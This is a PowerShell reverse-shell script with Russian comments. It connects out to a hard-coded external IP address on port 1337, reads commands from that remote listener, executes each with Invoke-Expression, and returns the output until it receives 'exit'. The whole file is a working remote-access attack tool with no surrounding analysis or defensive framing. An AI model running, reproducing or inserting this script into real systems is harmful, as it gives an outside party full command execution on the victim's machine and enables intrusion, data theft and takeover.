# Укажите IP-адрес и порт вашего управляющего устройства (listener)
$ip = "46.30.42.40" # IP вашего сервера
$port = 1337 # Порт для соединения
# Создаём клиентский объект для TCP-соединения
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
# Создаём буфер для данных
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
try {
# Запускаем цикл для выполнения команд с удалённого сервера
while ($true) {
$writer.Write("PS > ")
$writer.Flush()
# Считываем входящую команду
$cmd = $reader.ReadLine()
if ($cmd -eq "exit") { break }
# Выполняем команду и отправляем результат обратно
$result = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
$writer.WriteLine($result)
$writer.Flush()
}
} catch {
# Если что-то пошло не так, отобразить сообщение об ошибке
$writer.WriteLine("Connection Error: $_")
$writer.Flush()
}
# Закрываем соединение
$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()